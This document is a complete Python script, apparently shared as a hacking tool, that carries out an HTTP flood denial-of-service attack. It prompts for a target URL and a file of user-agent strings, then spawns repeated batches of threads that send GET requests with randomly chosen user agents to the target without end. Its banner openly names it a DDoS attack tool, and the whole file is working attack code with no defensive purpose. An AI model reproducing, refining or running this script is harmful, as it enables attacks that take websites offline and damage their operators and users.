import socket, threading, requests, random, time, os
print("")
print("  _    _                                      _     _____  _____        _____   ____   ___  ")
print(" | |  | |               /\                   | |   |  __ \|  __ \      / ____| |___ \ / _ \ ")
print(" | |  | |___  ___ _ __ /  \   __ _  ___ _ __ | |_  | |  | | |  | | ___| (___     __) | | | |")
print(" | |  | / __|/ _ \ '__/ /\ \ / _` |/ _ \ '_ \| __| | |  | | |  | |/ _ \ ___ \   |__ <| | | |")
print(" | |__| \__ \  __/ | / ____ \ (_| |  __/ | | | |_  | |__| | |__| | (_) |___) |  ___) | |_| |")
print("  \____/|___/\___|_|/_/    \_\__, |\___|_| |_|\__| |_____/|_____/ \___/_____/  |____(_)___/ ")
print("                              __/ |                                                         ")
print("                             |___/                                                          ")
print(" Script By DrSquid")
print("")
print(" This Script uses UserAgents as bots in a DDoS Attack.")
print(" A text file with UserAgents is required for this script to work.")
print("")
while True:
    file = input("[+] Enter the txt file with bots: ")
    try:
        with open(file, 'r') as useragentlist:
            useragentlists = useragentlist.readlines()
        useragents = []
        for agents in useragentlists:
            useragents.append(agents.strip())
        break
    except:
        print("[+] Invalid File Specified.")
while True:
    try:
        ip = input("[+] Enter IP to attack(include the 'https://www.'): ")
        cooldown = int(input("[+] How long is the cooldown(recommended for smaller websites)?: "))
        threadstocreate = int(input("[+] How many threads do you want to create before a cooldown?: "))
        inthreadcooldown = int(input("[+] What is the cool down for each thread?: "))
        if 'http' not in ip and 'https' not in ip:
            print("[+] Please include the https:// when inputting the IP and also the www. if it is a website.\n")
        elif threadstocreate == 0:
            print("[+] Make sure to have at least one thread created at a time, otherwise the DDoS Attack wont happen!\n")
        else:
            print('[+] Website to be Attacked:', ip)
            print('\n[+] Getting Bots/Useragents Ready........')
            time.sleep(3)
            break
    except:
        print("[+] Invalid Input.")
bot_count = 1
for agent in useragents:
    os.system('cls')
    print("[+] Readying DDoS Attack........")
    print("")
    print(f"[+] {bot_count} Bots loaded.")
    bot_count += random.randint(5, 10)
    if bot_count >= (len(useragents)-1):
        break
sent = 0
prevcount = 0
def ddos():
    global sent
    global prevcount
    global dif
    while True:
        bot = useragents[random.randint(0, (len(useragents) - 1))]
        try:
            headers = {"User-Agent": bot}
            response = requests.get(ip, headers=headers)
            os.system('cls')
            print(f'[+] Server Response: {response} Sent: {sent}')
            response.close()
            sent += 1
            time.sleep(inthreadcooldown)
        except requests.exceptions.ConnectionError:
            pass
threads = []
while True:
    for i in range(threadstocreate):
        try:
            x = threading.Thread(target=ddos)
            x.start()
            threads.append(x)
        except:
            pass
    for thread in threads:
        thread.join()
    time.sleep(cooldown)
    threads = []
